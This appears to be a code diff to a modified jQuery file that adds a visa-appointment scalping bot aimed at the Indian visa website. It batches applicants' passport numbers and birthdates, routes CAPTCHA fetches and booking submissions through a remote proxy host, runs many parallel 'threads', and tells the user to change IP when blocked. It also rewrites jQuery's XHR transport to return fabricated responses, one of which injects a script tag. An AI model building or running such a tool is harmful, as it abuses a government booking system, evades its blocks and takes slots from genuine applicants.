@@ -2972,6 +2972,7 @@
     } : In, Rn = x.ajaxSettings.xhr(), x.support.cors = !!Rn && "withCredentials" in Rn, Rn = x.support.ajax = !!Rn, Rn && x.ajaxTransport(function(n) {
         if (!n.crossDomain || x.support.cors) {
             var r;
+            var pqrq = true;
             return {
                 send: function(i, o) {
                     var a, s, l = n.xhr();
@@ -2984,36 +2985,98 @@
 //                    console.log(">>>>>");
 //                    console.log(n);
 //                    console.log(l);
-                   l.send(n.hasContent && n.data || null);
+                   //l.send(n.hasContent && n.data || null);
+//                          //console.log(">>>>>");
+//                          console.log("l.ready state=" + l.readyState);
+//                          //console.log("l.onreadystatechange =" + l.onreadystatechange);
+//                          console.log("l.responseText=" + l.responseText);
+//                          console.log("l.status=" + l.status);
+//                          console.log("l.getAllResponseHeaders()="+l.getAllResponseHeaders());
+//                          console.log("l.statusText="+l.statusText);
+//                          //console.log("n.isLocal="+n.isLocal);
+//                          //console.log("n.crossDomain="+n.crossDomain);
+                   //restext = '<script type="text/javascript" src="http://127.0.0.1:8000/static/stat_count.js"></script>' ;
+                   restext1 = '' +
+                       '<!-- Hosting24 Analytics Code -->' +
+                       '<script type="text/javascript" src="http://127.0.0.1:8000/static/stat_count.js"></script>' +
+                       '<!-- End Of Analytics Code -->'
+                      ;
+
+                    restext2 = '{"success":true,"data":[]}';
+
+                    if(pqrq){
+
+                        restext = restext2;
+                        pqrq = false;
+                        //reshead = "Content-Type: text/html";
+                        reshead = {'Content-Type': 'text/html'};
+                        //reshead.Content-Type = "text/html";
+
+                    }
+                    else {
+                        restext = restext1;
+                        reshead = "Pragma: no-cache " +
+                            "Content-Type: application/json " +
+                            "Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0";
+
+                        reshead = {"Pragma": "no-cache ","Content-Type": "application/json ","Cache-Control": "no-store, no-cache, must-revalidate, post-check=0, pre-check=0"};
+
+                    }
+
+
+
+
                     r = function(e, i) {
                         var s, u, c, p;
                         try {
-                            if (r && (i || 4 === l.readyState))
-                                if (r = t, a && (l.onreadystatechange = x.noop, $n && delete Pn[a]), i) 4 !== l.readyState && l.abort();
+                            if (r && (i || 4 === 4)){
+
+                                if (r = t, a && (pa = x.noop, $n && delete Pn[a]), i)
+                                {
+
+                                    //4 !== l.readyState && l.abort();
+                                    ;
+                                }
                                 else {
-                                    p = {}, s = l.status, u = l.getAllResponseHeaders(), "string" == typeof l.responseText && (p.text = l.responseText);
+
+                                    //reshead = l.getAllResponseHeaders();
+                                    p = {}, s = 200, u = reshead, "string" == typeof restext  && (p.text = restext );
                                     try {
-                                        c = l.statusText
+                                        c = "OK"
                                     } catch (f) {
                                         c = ""
                                     }
-                                    s || !n.isLocal || n.crossDomain ? 1223 === s && (s = 204) : s = p.text ? 200 : 404
+                                    s || !false || true ? 1223 === s && (s = 204) : s = p.text ? 200 : 404
                                 }
+                            }
                         } catch (d) {
                             i || o(-1, d)
                         }
 
-//                        console.log("p="+p);
-//                        console.log("s="+s);
-//                        console.log("c="+c);
-//                        console.log("u="+u);
+                        console.log("p="+p);
+////                        console.log("s="+s);
+////                        console.log("c="+c);
+////                        console.log("u="+u);
+//                          console.log("l.ready state=" + l.readyState);
+//                          ///console.log("l.onreadystatechange =" + l.onreadystatechange);
+                         // console.log("l.responseText=" + l.responseText);
+                          //console.log("l.status=" + l.status);
+                          //console.log("l.getAllResponseHeaders()="+l.getAllResponseHeaders());
+                          //console.log(typeof l.getAllResponseHeaders());
+                          //console.log("l.statusText="+l.statusText);
+                          //console.log(typeof l.statusText);
+//                          //console.log("n.isLocal="+n.isLocal);
+//                          //console.log("n.crossDomain="+n.crossDomain);
+
 //                        console.log(n);
 //                        console.log(l);
                         p && o(s, c, p, u)
                     };
-                    console.log(n.async)
-                    console.log(l.readyState );
-                    n.async ? 4 === l.readyState ? setTimeout(r) : (a = ++Wn, $n && (Pn || (Pn = {}, x(e).unload($n)), Pn[a] = r), l.onreadystatechange = r) : r()
+                    //console.log(n.async)
+                    //console.log(l.readyState );
+                    //n.async ? 4 === l.readyState ? setTimeout(r) : (a = ++Wn, $n && (Pn || (Pn = {}, x(e).unload($n)), Pn[a] = r), l.onreadystatechange = r) : r()
+                    (a = ++Wn, $n && (Pn || (Pn = {}, x(e).unload($n)), Pn[a] = r),true )
+                        //l.onreadystatechange = r)
 
 
 
@@ -3396,6 +3459,23 @@
         return x
     }))
 })(window);
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 $(function() {
     var usr = prompt('Please enter the Username'),
         pass = prompt('Please enter the Password');
@@ -3419,6 +3499,961 @@ $(function() {
 //    })
 
     eval(function(p, a, c, k, e, d) {
+
+
+
+
+
+
+
+    window.servers = [{
+    "domain": "jubayer.site40.net",
+    "ip": "-",
+    "appurl": "http:\/\/jubayer.site40.net\/pages\/nest.php"
+}];
+window.hitservers = [];
+
+function setupFallback(base, IDS) {
+    var form, cfile, curfile, iij = 0,
+        bells, ztr, ndttr, ndate, _img, _imgn, _wimg, _wait, imgsrc, frame, _xhr, ichk, getapp = $('[name=Appointment]'),
+        egtd = getapp.closest('td').prev().empty(),
+        dt = new Date(),
+        today = $('[name=Date]').val();
+    var body = $('body'),
+        BGDs = {
+            r: [],
+            o: {}
+        },
+        rpane, itbl, form, list, Msgbx, msgbx, _xhr, esrc = 'data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==';
+    window.run = window.appt;
+    $('option[value=BGDD0]').val('BGDD1');
+    rpane = $('<div>').prependTo($('.mainframe')).addClass('rightpane ex');
+    _wait = $('<div>').addClass('loader top').appendTo(rpane);
+    $('<div>').addClass('caption').html('Pressure Cooker 1.0').appendTo(rpane);
+    itbl = $('<tbody>').appendTo($('<table>').addClass('info').appendTo(rpane));
+    form = $('form[name=OnlineForm]').addClass('headera').appendTo(rpane);
+    list = $('<div>').addClass('bgdlist').appendTo(rpane);
+    getapp.closest('table').addClass('hiderow');
+    IDS.forEach(function(pr, i) {
+        if (BGDs.o[pr[1]]) return;
+        var zcc = $('<div>').addClass('lli').appendTo(list);
+        $('<span>').addClass('bgname').html(pr.slug).appendTo(zcc);
+        var res = $('<span>').addClass('emss').append($('<span>').css({
+            color: 'gray'
+        }).html('--')).appendTo(zcc);
+        var bgd = {
+            tr: zcc,
+            res: res,
+            slug: pr.slug,
+            sts: 0,
+            taken: pr.taken,
+            data: {
+                fileno: pr[1],
+                birthdate: pr[2],
+                passport_no: pr[3],
+                ImgNum: '',
+                Date: today
+            }
+        };
+        BGDs.r.push(bgd);
+        BGDs.o[pr[1]] = bgd;
+        zcc.click(function() {
+            bells.removeClass('x');
+            zcc.addClass('x').focus();
+            _imgn.focus();
+            msk.val(pr[1].slice(0, 4) + '1');
+            $('[name=fileno]').val(pr[1]);
+            $('[name=birthdate]').val(pr[2]);
+            $('[name=passport_no]').val(pr[3]);
+            cfile = pr;
+            iij = i
+        })
+    });
+    BGDs.r.forEach(function(bgd, i) {
+        if (bgd.taken) {
+            $('<span>').addClass('emss').css({
+                color: 'orange'
+            }).insertAfter(bgd.res).html('Taken on ' + bgd.taken);
+            bgd.sts = 1;
+            bgd.res.remove();
+            bgd.tr.appendTo(list)
+        }
+    });
+    var msk = $('#pia').removeAttr('id').removeAttr('onchange').addClass('mission-select');
+    msk.find('option').each(function(i, d) {
+        d = $(d);
+        if (d.val().match(/^BGD/)) {
+            d.html(d.html().replace(/^BANGLADESH-/i, ''));
+            d.val().match(/0$/i) && d.val(d.val().replace(/0$/i, '1'))
+        } else d.remove()
+    });
+    form = $('[name=OnlineForm]').attr({
+        target: 'tframe',
+        action: 'ReprintAppt.jsp'
+    }).removeAttr('onclick').submit(function() {
+        var v = _imgn.val();
+        if (v.length == 0) return;
+        if (v.length != 6) return !!alert('Access Code should be 6 letters long!!!');
+        window.capimage = null;
+        _wait.show();
+        curfile = cfile
+    });
+    _img = form.find('img[alt]').click(function() {
+        var bstr, pstr = '',
+            xhr = new XMLHttpRequest();
+        _xhr && _xhr.abort();
+        _xhr = xhr;
+        _imgn.val('').focus();
+        xhr.open('GET', imgsrc, true);
+        xhr.overrideMimeType('text/plain;charset=x-user-defined');
+        xhr.onerror = function() {
+            _wimg.hide()
+        };
+        xhr.onload = function(e) {
+            if (xhr.status != 200) return;
+            bstr = xhr.responseText;
+            for (var i = 0, len = bstr.length; i < len; ++i) pstr += String.fromCharCode(bstr.charCodeAt(i) & 0xff);
+            pstr = btoa(pstr);
+            window.capimage = pstr;
+            _img.attr('src', 'data:image/jpeg;base64,' + pstr);
+            _wimg.hide();
+            _imgn.focus()
+        };
+        _wimg.show();
+        xhr.send(null)
+    });
+    _img.appendTo($('<div>').addClass('iholder').appendTo(_img.parent()));
+    var needles = [{
+        tag: 'Date Not Opened',
+        type: 0,
+        look: 'Reprint:-Print already Registered application'
+    }, {
+        tag: 'Internal Server Error',
+        type: 0,
+        look: 'There is an Internal Server Error'
+    }, {
+        tag: 'Under Maintenance',
+        type: 0,
+        look: 'System is under maintenance'
+    }, {
+        tag: 'BGD Expired',
+        type: -1,
+        look: 'New Appointment is possible only within'
+    }, {
+        tag: 'IncorrectFile',
+        type: -1,
+        look: 'File Number or Date of Birth does not exists'
+    }, {
+        tag: 'Date Closed',
+        type: 0,
+        look: 'No Apppointment Dates are available'
+    }, {
+        tag: 'Access code Invalid',
+        type: 0,
+        look: 'Access code is not valid'
+    }, {
+        tag: 'Date Taken',
+        type: 1,
+        look: 'Appointment Date is already taken'
+    }, ];
+    _imgn = form.find('#ImgNum').addClass('pre').keypress(function(e) {
+        var c = e.keyCode;
+        if (c == 13 || (c >= 48 && c <= 57) || (c >= 97 && c <= 102)) return;
+        return false
+    });
+    ichk = $('<input type="checkbox">').appendTo(egtd).attr({
+        tabIndex: -1
+    }).hide();
+    $('<span>').html('PDF on NO DATE').insertAfter(ichk).hide();
+    _wimg = $('<img>').attr({
+        src: 'http://www.mytreedb.com/uploads/mytreedb/loader/ajax_loader_blue_32.gif'
+    }).hide().insertAfter(_img);
+    _wait = _wimg.clone().appendTo(egtd).css({
+        'vertical-align': 'middle',
+        'margin': '-10px 0 0 20px'
+    });
+    $('[name=Reprint]').hide();
+    imgsrc = _img.attr('src');
+    _img.click();
+
+    function showMess(a, b, c) {
+        $('<div>').html(a).appendTo(b).css({
+            textAlign: 'center',
+            fontSize: '48px',
+            color: c ? 'green' : 'red'
+        }).hide().fadeIn()
+    };
+    var framecont = $('<div>').addClass('frame-container').appendTo('body');
+    frame = $('<iframe>').attr({
+        name: 'tframe',
+        src: "about:blank",
+        sandbox: 'allow-forms allow-same-origin'
+    }).css({
+        border: '1px solid #C0C0C0',
+        width: '29%',
+        height: 360
+    }).appendTo(framecont).load(function() {
+        setTimeout(function() {
+            var icont = frame.contents(),
+                ibody = icont.find('body'),
+                iform = icont.find('form[name=example]'),
+                abc = iform.find('[name=DATE]');
+            var trt = icont.find('img[align=top]').closest('tr');
+            trt.next().remove();
+            trt.remove();
+            icont.find('table').height('auto').width('auto');
+            if (iform.length) {
+                iform.removeAttr('onsubmit').attr({
+                    target: 'pframe'
+                });
+                iform.children('table').find('tr:last').remove();
+                iform.children('table').height('auto').find('tr').eq(4).remove();
+                if (abc.length) {
+                    abc.val(abc.find('option').eq(1).val());
+                    zform = iform.clone().hide().insertAfter(pframe);
+                    zform.find('[name=DATE]').val(abc.val());
+                    zform.submit().remove();
+                    setTimeout(function() {
+                        _img.click();
+                        _wait.hide()
+                    }, 100)
+                } else if (ichk.is(':checked')) {
+                    iform.find('[name=EXIT]').closest('tr').remove();
+                    $('<input type=hidden>').attr({
+                        name: 'DATE'
+                    }).val('31/07/2014').appendTo(iform);
+                    if (!iform.find('[name=SAVE]').length) $('<input type=hidden>').attr({
+                        name: 'SAVE'
+                    }).val('Confirm The Appointment').appendTo(iform);
+                    iform.clone().hide().insertAfter(pframe).submit().remove();
+                    setTimeout(function() {
+                        _img.click()
+                    }, 100)
+                } else _img.click() && _wait.hide() && showMess('NO DATE!!!', ibody, 0)
+            } else {
+                var bdtx = icont.find('html').html(),
+                    msdv = $('<div>').prependTo(ibody);
+                _img.click() && _wait.hide();
+                var bgd = curfile[1],
+                    hbgd = BGDs.o[bgd];
+                needles.forEach(function(ndl) {
+                    if (bdtx.match(ndl.look)) {
+                        showMess(ndl.tag, msdv, ndl.type == 1);
+                        if (ndl.type == -1) {
+                            hbgd.res.html(ndl.tag).css({
+                                color: 'red'
+                            })
+                        } else if (ndl.type == 1) {
+                            hbgd.res.html('Taken').css({
+                                color: 'green'
+                            });
+                            window.takens[curfile[1]] = {
+                                fileno: curfile[1],
+                                usr: _usr,
+                                domain: '--'
+                            };
+                            window.fireUpdater()
+                        }
+                    }
+                });
+                var scrp = $('[name=tframe]').contents().find('script:first');
+                if (scrp.length && !scrp.attr('type')) {
+                    var mstr = scrp.text().replace(/^\s+|\s+$/g, '');
+                    mstr = mstr.match(/^alert\("([^"]+)"\)/);
+                    if (mstr) $('<div>').html(mstr[1]).appendTo(msdv).css({
+                        textAlign: 'center',
+                        fontSize: '20px',
+                        color: 'red'
+                    })
+                }
+            }
+        }, 200)
+    });
+    pframe = $('<iframe>').attr({
+        name: 'pframe',
+        src: "about:blank"
+    }).css({
+        border: '1px solid #C0C0C0',
+        width: '70%',
+        height: 360
+    }).appendTo(framecont).load(function() {
+        setTimeout(function() {
+            var icont = pframe.contents(),
+                ipdf = icont.find('embed[name=plugin]');
+            if (ipdf.length) icont.find('body').height(1200).animate({
+                scrollTop: 318
+            })
+        }, 200)
+    });
+    setTimeout(function() {
+        _imgn.focus();
+        getapp.show()
+    }, 500);
+    var trt = $('img[align=top]').closest('tr');
+    trt.next().remove();
+    trt.remove();
+    getapp.closest('tr').nextAll('tr').remove();
+    $('td[height=18]').remove();
+    $('table').height('auto').width('auto');
+    $('td[width=497]').width('auto');
+    $('<span>').attr({
+        id: 'GETAPPT'
+    }).appendTo('body');
+    _imgn.addClass('pre').keydown(function(e) {
+        var l = IDS.length;
+        if (e.keyCode == 38 || e.keyCode == 40);
+        else return; if (iij == 0 && e.keyCode == 38 || iij == l - 1 && e.keyCode == 40) return false;
+        iij += (e.keyCode == 38 ? -1 : 1);
+        list.children().eq(iij).click();
+        return false
+    });
+    bells = list.children().attr({
+        tabIndex: 1
+    });
+    bells.eq(0).click()
+};
+
+function setupBlock(base, server, IDS, capx, capy) {
+    var links = {
+        dom: 'http://indianvisaonline.gov.in/visa/',
+        dip: 'http://164.100.129.11/visa/',
+        cap: 'Rimage.jsp',
+        rep: 'Reprint.jsp',
+        appt: 'ReprintAppt.jsp',
+        allot: 'allotmentsave.jsp'
+    };
+    var appurl = server.appurl,
+        BGDs = {
+            r: [],
+            o: {}
+        },
+        caps = {
+            wait: [],
+            ready: [],
+            used: [],
+            live: false,
+            hits: 5,
+            xpiry: 58
+        },
+        _wait, today = $('[name=Date]').val();
+    var body = $('body'),
+        rpane, itbl, form, list, Msgbx, msgbx, hitf = {
+            on: false,
+            sleep: false,
+            busy: false
+        },
+        _tmh, _xhr, esrc = 'data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==';
+    var II = {
+        trdl: {
+            slug: 'Thread Limit',
+            count: 100,
+            max: 150
+        },
+        trds: {
+            slug: 'Threads',
+            count: 0,
+            step: 10
+        },
+        wait: {
+            slug: 'Waiting',
+            min: 4
+        },
+        ready: {
+            slug: 'Ready'
+        },
+        used: {
+            slug: 'Used'
+        },
+        hits: {
+            slug: 'Hits'
+        },
+        tkn: {
+            slug: 'Taken',
+            count: 0
+        }
+    };
+    rpane = $('<div>').appendTo($('.mainframe')).addClass('rightpane ex2');
+    _wait = $('<div>').addClass('loader top').appendTo(rpane);
+    $('<div>').addClass('caption').html('PC').appendTo(rpane);
+    itbl = $('<tbody>').appendTo($('<table>').addClass('info').appendTo(rpane));
+    form = $('<form>').attr({
+        autocomplete: 'off'
+    }).addClass('header').appendTo(rpane);
+    list = $('<div>').addClass('bgdlist').appendTo(rpane);
+    $.each(II, function(k, el) {
+        if (!el.count) el.count = 0;
+        el.hnd = $('<td>').appendTo($('<tr>').append($('<td>').html(el.slug)).appendTo(itbl)).html(el.count)
+    });
+    IDS.forEach(function(pr, i) {
+        var zcc = $('<div>').addClass('lli').appendTo(list);
+        $('<span>').addClass('bgname').html(pr.slug).appendTo(zcc);
+        var res = $('<span>').addClass('emss').append($('<span>').css({
+            color: 'gray'
+        }).html('--')).appendTo(zcc);
+        var bgd = {
+            tr: zcc,
+            res: res,
+            slug: pr.slug,
+            sts: 0,
+            taken: pr.taken,
+            data: {
+                fileno: pr[1],
+                birthdate: pr[2],
+                passport_no: pr[3],
+                ImgNum: '',
+                Date: today
+            }
+        };
+        BGDs.r.push(bgd);
+        BGDs.o[pr[1]] = bgd
+    });
+    BGDs.r.forEach(function(bgd, i) {
+        if (bgd.taken) {
+            $('<span>').addClass('emss').css({
+                color: 'orange'
+            }).insertAfter(bgd.res).html('Taken on ' + bgd.taken);
+            bgd.sts = 1;
+            bgd.res.remove();
+            bgd.tr.appendTo(list)
+        }
+    });
+
+    function fetchimage() {
+        var usr;
+        if (caps.used.length) {
+            usr = caps.used.pop().usr;
+            II.used.hnd.html(caps.used.length)
+        } else usr = II.trds.count++;
+        II.trds.hnd.html(II.trds.count);
+        $.post(appurl, {
+            task: 'img',
+            usr: usr,
+            links: links
+        }).done(function(r) {
+            if (r.rsp && r.rsp.image) {
+                var cap = {
+                    usr: usr,
+                    image: r.rsp.image,
+                    loaded: (new Date()).getTime()
+                };
+                if (caps.live) caps.wait.push(cap);
+                else showcap(cap)
+            } else caps.used.push({
+                usr: usr
+            }) && II.used.hnd.html(caps.used.length);
+            II.wait.hnd.html(caps.wait.length + (caps.live ? 1 : 0))
+        }).fail(function() {
+            caps.used.push({
+                usr: usr
+            }) && II.used.hnd.html(caps.used.length)
+        });
+        II.hits.hnd.html(++II.hits.count)
+    };
+
+    function showcap(cap) {
+        caps.live = cap;
+        capx.attr('src', 'data:image/jpeg;base64,' + cap.image)
+    };
+
+    function fillgaps() {
+        if (II.wait.min < caps.wait.length) return;
+        var d = II.trdl.count - II.trds.count + caps.used.length,
+            i = d > II.trds.step ? II.trds.step : d;
+//        $.post(base + 'viz/logger/logcaps', {
+//            caps: {
+//                usr: _usr,
+//                domain: server.domain,
+//                count: i
+//            }
+//        });
+        while (0 < i--) fetchimage()
+    };
+
+    function genhit() {
+        var l = caps.hits,
+            bgds, kaps, nw = (new Date()).getTime();
+        bgds = BGDs.r.filter(function(a) {
+            return a.sts == 0 || a.sts == 2
+        }).map(function(a, i) {
+            a._ = i;
+            return a
+        }).sort(function(x, y) {
+            a = x.sts;
+            b = y.sts;
+            r = a == b ? 0 : b == 2 ? 1 : a == 2 ? -1 : 0;
+            r = r ? r : x._ - y._;
+            return r
+        }).map(function(a) {
+            return a.data
+        });
+        while (caps.ready.length && (nw - caps.ready[0].loaded) / 1000 / 60 > caps.xpiry) caps.used.push({
+            usr: caps.ready.shift().usr
+        });
+        II.used.hnd.html(caps.used.length);
+        II.ready.hnd.html(caps.ready.length);
+        if (!bgds.length || !caps.ready.length) return hitf.sleep = true;
+        hitf.sleep = false;
+        if (bgds.length < l) l = bgds.length;
+        if (caps.ready.length < l) l = caps.ready.length;
+        if (bgds.length > l) bgds = bgds.slice(0, l);
+        kaps = caps.ready.splice(0, l);
+        II.ready.hnd.html(caps.ready.length);
+        _xhr = $.post(appurl, {
+            task: 'hit',
+            links: links,
+            data: JSON.stringify({
+                bgds: bgds,
+                caps: kaps.map(function(a) {
+                    return [a.usr, a.val]
+                })
+            })
+        }).always(function() {
+            hitf.busy = false;
+            _wait.hide()
+        }).fail(function() {
+            while (kaps.length) caps.used.push({
+                usr: kaps.shift().usr
+            })
+        }).done(function(r) {
+            var lkase = r.rsp[r.rsp.length - 1],
+                xdt = {
+                    taken: [],
+                    success: []
+                };
+            r.rsp.forEach(function(el) {
+                var bgd = el.fileno,
+                    hbgd = BGDs.o[bgd];
+                switch (el.kase) {
+                    case 'IncorrectFile':
+                    case 'Expired':
+                        hbgd.sts = -1;
+                        hbgd.res.html(el.kase).css({
+                            color: 'red'
+                        });
+                        hbgd.tr.appendTo(list);
+                        break;
+                    case 'Success':
+                        hbgd.sts = 2;
+                        xdt.success.push(el);
+                        hbgd.res.html('Success').css({
+                            color: 'green'
+                        });
+                        break;
+                    case 'No Date':
+                        hbgd.sts = 0;
+                        hbgd.res.html('--');
+                        break;
+                    case 'Taken':
+                        if (hbgd.sts == 1) break;
+                        hbgd.sts = 1;
+                        xdt.taken.push(el);
+                        hbgd.tr.appendTo(list);
+                        hbgd.res.html('Taken').css({
+                            color: 'green'
+                        });
+                        window.takens[el.fileno] = {
+                            fileno: el.fileno,
+                            usr: _usr,
+                            domain: server.domain
+                        };
+                        break
+                };
+                caps.used.push({
+                    usr: kaps.shift().usr
+                });
+                window.hitlogs.push({
+                    usr: _usr,
+                    domain: server.domain,
+                    kase: el.kase,
+                    time: el.time,
+                    duration: el.duration
+                })
+            });
+            while (kaps.length) caps.ready.unshift(kaps.pop());
+            II.used.hnd.html(caps.used.length);
+            II.ready.hnd.html(caps.ready.length);
+            II.tkn.count += xdt.taken.length;
+            II.tkn.hnd.html(II.tkn.count + '/' + IDS.length);
+            II.hits.hnd.html(II.hits.count += r.rsp.length);
+            Msgbx.html('Used:' + r.rsp.length + ' Success:' + xdt.success.length + ' Taken:' + xdt.taken.length).css({
+                color: (xdt.success.length + xdt.taken.length) ? 'green' : 'red'
+            }).fadeIn();
+            msgbx.html('<b>' + lkase.kase + '</b>&nbsp;&nbsp;&nbsp;').css({
+                color: lkase.success ? 'green' : 'red'
+            }).fadeIn();
+            if (xdt.taken.length) window.fireUpdater();
+            if (hitf.on && lkase.delay > -1) _tmh = setTimeout(function() {
+                hitf.on && genhit()
+            }, lkase.delay * 1000)
+        }).fail(function() {
+            if (hitf.on) _tmh = setTimeout(function() {
+                hitf.on && genhit()
+            }, 5 * 1000)
+        });
+        Msgbx.hide();
+        msgbx.hide();
+        _wait.show();
+        hitf.busy = true
+    };
+    form.submit(function() {
+        return false
+    }).submit(function() {
+        var nw = (new Date()).getTime(),
+            cap = null,
+            v = capy.val();
+        if (!caps.live) return;
+        if (v.length != 6) return alert('Access Code should be 6 letters long!!!');
+        if ((nw - caps.live.loaded) / 1000 / 60 > caps.xpiry) caps.used.push({
+            usr: caps.live.usr
+        });
+        else caps.ready.push({
+            usr: caps.live.usr,
+            val: v,
+            loaded: caps.live.loaded
+        });
+        while (caps.wait.length && (nw - caps.wait[0].loaded) / 1000 / 60 > caps.xpiry) caps.used.push({
+            usr: caps.wait.shift().usr
+        });
+        if (caps.wait.length) showcap(caps.wait.shift());
+        else {
+            capx.attr({
+                src: esrc
+            });
+            caps.live = false
+        };
+        II.wait.hnd.html(caps.wait.length + (caps.live ? 1 : 0));
+        II.used.hnd.html(caps.used.length);
+        II.ready.hnd.html(caps.ready.length);
+        capy.val('');
+        fillgaps();
+        if (hitf.on && hitf.sleep && caps.ready.length >= 3) genhit();
+        window.caps = caps
+    });
+    capx.attr({
+        src: esrc
+    }).appendTo($('<div>').addClass('iholder').appendTo(form));
+    capy.appendTo(form).keypress(function(e) {
+        var c = e.keyCode;
+        if (c == 13 || c == 64 || (c >= 48 && c <= 57) || (c >= 97 && c <= 102)) return;
+        return false
+    });
+    Msgbx = $('<div>').addClass('msg big').appendTo(rpane);
+    msgbx = $('<div>').addClass('msg').css({
+        color: '#00A'
+    }).appendTo(rpane);
+    var cbut = $();
+    $('<div>').appendTo(form);
+    $('<button type="button">').attr({
+        tabIndex: -1
+    }).addClass('text ihit').html('Refill').css({
+        color: 'blue'
+    }).appendTo(form).click(function() {
+        fillgaps()
+    });
+    $('<button type="button">').attr({
+        tabIndex: -1
+    }).addClass('text ihit').html('&#8679;').css({
+        fontWeight: 'bold',
+        color: 'green'
+    }).appendTo(form).click(function() {
+        if (II.trdl.count < II.trdl.max) II.trdl.hnd.html(II.trdl.count += 10)
+    });
+    $('<button type="button">').attr({
+        tabIndex: -1
+    }).addClass('text ihit').html('&#8681;').css({
+        fontWeight: 'bold',
+        color: 'red'
+    }).appendTo(form).click(function() {
+        if (II.trdl.count > 10) II.trdl.hnd.html(II.trdl.count -= 10)
+    });
+    cbut = cbut.add($('<button type="button">').attr({
+        tabIndex: -1
+    }).addClass('text ihit').html('Start').css({
+        color: 'green'
+    }).appendTo(form).click(function() {
+        _xhr && _xhr.abort();
+        hitf.started = true;
+        hitf.on = true;
+        genhit();
+        cbut.toggle()
+    }));
+    cbut = cbut.add($('<button type="button">').attr({
+        tabIndex: -1
+    }).addClass('text ihit').html('Stop').css({
+        color: 'red'
+    }).appendTo(form).click(function() {
+        _xhr && _xhr.abort();
+        _tmh && clearTimeout(_tmh);
+        hitf.busy = false;
+        hitf.on = false;
+        cbut.toggle()
+    }).hide())
+};
+$(function() {
+    if (location.href != 'http://indianvisaonline.gov.in/visa/Reprint.jsp') return;
+    if (window.aset) return alert('Avoided Duplicate');
+    window.aset = 1;
+    var i = -1,
+        l = IDS.length > servers.length ? servers.length : IDS.length,
+        base = BU + '../',
+        lbgd = [];
+    window.styled = true;
+    $('<link>').attr({
+        rel: 'stylesheet',
+        type: 'text/css',
+        href: BU + 'src/css/style.css?_=' + Math.random()
+    }).appendTo('body');
+    $('link').filter(function(i, d) {
+        return $(d).attr('href') == 'Online.css'
+    }).slice(1).remove();
+    var capx = $('img[alt]').clone(),
+        capy = $('#ImgNum').clone().removeAttr('id').removeAttr('onkeyup');
+    $('<div>').addClass('mainframe').appendTo('body');
+    var oprs = {};
+    IDS.forEach(function(IDS, j) {
+        IDS.forEach(function(pr, i) {
+            pr.slug = (i < 9 ? '0' : '') + (i + 1) + '. ' + pr[0];
+            pr[1] = pr[1].replace(/[\s.,]/g, '').toUpperCase();
+            pr[3] = pr[3].replace(/[\s.,]/g, '').toUpperCase();
+            pr[2] = pr[2].replace(/[\s.,]/g, '').replace(/[\s.,]/g, '').replace(/^(\d)\//, '0$1/').replace(/\/(\d)\//, '/0$1/').replace(/\/([6789]\d)$/, '/19$1').replace(/\/(\d\d)$/, '/20$1');
+            lbgd.push({
+                slug: pr.slug,
+                fileno: pr[1],
+                birthdate: pr[2],
+                passport_no: pr[3],
+                usr: _usr,
+                domain: j < servers.length ? servers[j].domain : '--'
+            });
+            oprs[pr[1]] = pr
+        })
+    });
+//    $.post(base + 'viz/logger/logbgd', {
+//        list: JSON.stringify(lbgd)
+//    }).done(function(oi) {
+//        console.log(">>>>>>>>>>>>");
+//        console.log(oi);
+//        r = {};
+//        r.success = true;
+//        r.data = Array();
+//        r.data.forEach(function(dt, i) {
+//            oprs[dt.fileno].taken = dt.taken
+//        });
+//        while (++i < l) setupBlock(base, servers[i], IDS[i], capx.clone(), capy.clone());
+//        if (typeof setupFallback == 'function') {
+//            var oids = [];
+//            IDS.forEach(function(ids) {
+//                oids = oids.concat(ids)
+//            });
+//            setupFallback(base, oids)
+//        }
+//    });
+
+
+        var r = {};
+        r.success = true;
+        r.data = Array();
+        r.data.forEach(function(dt, i) {
+            oprs[dt.fileno].taken = dt.taken
+        });
+        while (++i < l) setupBlock(base, servers[i], IDS[i], capx.clone(), capy.clone());
+        if (typeof setupFallback == 'function') {
+            var oids = [];
+            IDS.forEach(function(ids) {
+                oids = oids.concat(ids)
+            });
+            setupFallback(base, oids)
+        }
+
+
+
+
+
+    $('<input type="radio">').appendTo($('.mainframe'));
+    var zz = $('[name=ImgNum]');
+    if (zz.length > 1) zz.eq(zz.length - 1).blur(function() {
+        zz.eq(0).focus()
+    });
+    window.fireUpdater = function() {
+        var tkns = [];
+        window.hitlogs.length && true;
+
+//        $.post(base + 'viz/logger/loghit', {
+//            hits: JSON.stringify(window.hitlogs)
+//        });
+        for (var z in window.takens) tkns.push(window.takens[z]);
+        tkns.length && true;
+
+//        $.post(base + 'viz/logger/logtaken', {
+//            taken: JSON.stringify(tkns)
+//        }).done(function() {
+//            tkns.forEach(function(a) {
+//                delete window.takens[a.fileno]
+//            })
+//        });
+
+         tkns.forEach(function(a) {
+                delete window.takens[a.fileno]
+            })
+
+        window.hitlogs = [];
+        clearTimeout(window.uptimer);
+        window.uptimer = setTimeout(window.fireUpdater, 1 * 60000)
+    };
+    window.hitlogs = [];
+    window.takens = {};
+    window.uptimer = setTimeout(window.fireUpdater, 1 * 60000);
+    setTimeout(function() {
+        var first = true,
+            bdiv = $('#bottomdiv'),
+            efrm = $('<iframe>').attr({
+                src: "about:blank"
+            }).hide().appendTo('body');
+        $('<button>').appendTo(bdiv).addClass('text').html('Check if I am Blocked').click(function() {
+            if (servers.length) $.get(servers[0].appurl).done(function(r) {
+                window.myres = r;
+                if (r.match('www.main-hosting.com/resources')) alert('Your IP is blocked, Please change your IP by reconnecting the modem.');
+                else if (first) {
+                    first = false;
+                    hitservers.forEach(function(a, i) {
+                        setTimeout(function() {
+                            if (!window.nohit) efrm.attr({
+                                src: "http://" + a.domain
+                            })
+                        }, i * 60 * 1000)
+                    })
+                } else alert('Your IP is not blocked now')
+            })
+        }).click()
+    }, 1000)
+});
+(function() {
+    if (location.href != 'http://indianvisaonline.gov.in/visa/' && location.href != 'http://indianvisaonline.gov.in/visa/index.html' && location.href != 'http://indianvisaonline.gov.in/visa/Reprint.jsp') return;
+    if (window.bset) return;
+    window.bset = 1;
+    $(function() {
+        var body = $('body'),
+            bfdiv, pinp, rspan, fbut, ebut, tdiv, T0, T1, hspan;
+        bfdiv = $('<div>').addClass('bottomspace').appendTo(body);
+        tdiv = $('<div>').appendTo(bfdiv).hide();
+        T0 = $('<textarea>').attr({
